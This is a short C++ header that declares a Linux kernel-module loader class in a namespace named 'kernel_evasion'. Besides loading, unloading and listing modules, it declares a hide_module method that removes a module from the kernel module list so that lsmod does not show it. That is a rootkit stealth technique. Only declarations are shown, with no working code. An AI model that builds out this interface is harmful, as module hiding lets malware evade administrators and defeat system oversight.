#pragma once

#include "common.h"
#include <map>

namespace kernel_evasion {

class LKMLoader {
public:
    LKMLoader();
    ~LKMLoader();

    // Load a kernel module from file path
    Result<int> load_module(const std::string& module_path,
                            const std::string& module_name,
                            const std::vector<std::string>& params = {});

    // Unload a loaded module
    ErrorCode unload_module(const std::string& module_name);

    // List currently loaded modules
    std::vector<std::string> list_loaded_modules();

    // Check if a module is loaded
    bool is_module_loaded(const std::string& module_name);

    // Hide a module from lsmod (remove from kernel module list)
    ErrorCode hide_module(const std::string& module_name);

    // Get module information
    struct ModuleInfo {
        std::string name;
        uint64_t address;
        size_t size;
        int ref_count;
    };

    Result<ModuleInfo> get_module_info(const std::string& module_name);

private:
    std::map<std::string, int> loaded_modules_;

    ErrorCode validate_module_compatibility(const std::string& module_path);
};

}  // namespace kernel_evasion
